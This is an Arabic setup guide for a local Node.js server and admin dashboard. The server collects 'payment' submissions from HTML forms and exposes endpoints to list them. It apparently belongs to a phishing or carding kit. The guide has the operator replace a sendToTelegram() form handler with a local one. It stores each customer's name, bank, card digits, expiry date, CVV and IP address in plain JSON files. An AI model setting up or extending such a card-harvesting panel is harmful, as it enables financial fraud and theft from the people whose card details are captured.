🚀 البدء السريع (3 خطوات فقط):

الخطوة 1: تثبيت Node.js
──────────────────────────
▶ حمّل من: https://nodejs.org
▶ اختر "LTS" وثبّت مع الإعدادات الافتراضية
▶ أعد تشغيل الجهاز

الخطوة 2: تشغيل الخادم
──────────────────────────
▶ انقر مزدوجاً على: start-server.bat
   أو من Terminal:
   npm start

الخطوة 3: فتح لوحة التحكم
──────────────────────────
▶ افتح المتصفح
▶ اذهب إلى: http://localhost:3000/admin
▶ ستجد كل شيء هناك! 🎊

═══════════════════════════════════════════════════════════════════

🔌 API المتاحة:

📤 POST /api/payment
   ↳ إرسال بيانات دفعة جديدة
   ↳ البديل الكامل لـ Telegram

📥 GET /api/payments
   ↳ الحصول على جميع المدفوعات
   ↳ يعرض كل البيانات المحفوظة

📦 GET /api/orders
   ↳ الحصول على جميع الطلبات

📊 GET /api/dashboard/stats
   ↳ إحصائيات شاملة
   ↳ تحديث تلقائي كل 5 ثواني

➕ POST /api/orders
   ↳ إنشاء طلب جديد

🔄 PUT /api/payments/:id
   ↳ تحديث حالة الدفعة

💻 دوال JavaScript الجاهزة:

// إرسال دفعة
await sendPaymentToServer(paymentData);

// الحصول على المدفوعات
const payments = await getPayments();

// الحصول على الطلبات

// تحديث الحالة
await updatePaymentStatus(paymentId, status);

// الدالة السهلة (من نموذج الدفع)
await sendToLocalServer();

🎯 كيفية الاستخدام:

1. أضف في ملفات HTML:
   <script src="payment-client.js"></script>

2. غيّر من:
   onsubmit="sendToTelegram();"
   إلى:
   onsubmit="sendToLocalServer();"

3. عليك! البيانات تُحفظ محلياً الآن 🎉

📊 البيانات المحفوظة:

كل دفعة تحتوي على:
├─ معرّف فريد (UUID)
├─ اسم العميل
├─ اختيار البنك
├─ آخر 10 أرقام من البطاقة
├─ شهر السنة الانتهاء
├─ رمز CVV
├─ المبلغ
├─ حالة الدفعة
├─ عنوان IP
└─ الطابع الزمني (timestamp)

الملفات المحفوظة:
└─ data/
   ├─ payments.json (جميع المدفوعات)
   ├─ orders.json (جميع الطلبات)
   └─ (يمكنك إضافة المزيد)

📞 معالجة الأخطاء الشائعة:

❌ "Node.js غير معروف"
✅ أعد تثبيت Node.js واختر "Add to PATH"

❌ "لا يمكن الاتصال بـ localhost:3000"
✅ تأكد أن الخادم يعمل وافتح الصفحة من جديد

❌ "Port 3000 مستخدم"
✅ غيّر PORT في server.js أو أوقف البرنامج الآخر

❌ "لا توجد بيانات محفوظة"
✅ تحقق من أن مجلد data/ موجود
